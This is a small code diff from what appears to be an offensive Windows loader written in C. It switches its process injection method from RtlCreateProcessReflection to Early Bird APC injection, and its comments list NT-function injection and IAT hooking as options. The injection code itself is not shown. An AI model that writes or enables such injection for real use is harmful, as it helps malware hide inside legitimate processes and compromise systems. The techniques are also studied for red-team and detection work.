@@ -59,9 +59,9 @@ int main(int argc, char* argv[])
 	// - Earlybird for APC routine in a suspended process
 	// - NTInject for simple exectuion with direct NT functions
 	printf("\n****** PROCESS INJECTION *****\n");
-	// earlybird(pi);
+	earlybird(pi);
 	// NTinject(); // Use with IAT Hooking
-	 myRtlCreateProcessReflection(pi.dwProcessId);
+	
 
 	// Uncomment for some sleeping
 	//Sleep(60000);
